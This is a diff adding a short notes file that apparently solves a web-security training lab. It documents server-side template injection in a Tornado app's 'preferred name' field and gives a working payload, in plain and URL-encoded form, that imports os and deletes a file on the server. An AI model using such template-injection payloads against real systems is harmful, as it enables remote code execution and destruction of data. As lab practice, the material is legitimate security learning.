@@ -1,0 +1,10 @@
+// Found user-controlled variable evaluated in expression tag at "preferred name" functionality in myaccount page
+// a POST parameter in "preferred name" functionality: blog-post-author-display=user.nickname
+
+// Trigger an exception with "user.nickname}}{{"
+// View the result of your injection in post comment
+
+// Read on Python Tornado documentation
+// Craft the exploit to delete file
+// user.nickname}} {% import os %} {{ os.remove("/home/carlos/morale.txt") }}
+blog-post-author-display=user.nickname}}+{%25+import+os+%25}+{{+os.remove("/home/carlos/morale.txt")+}}&csrf=VB0BeHVyA56Tlk468VFS6YT3ZIAnpEZ3
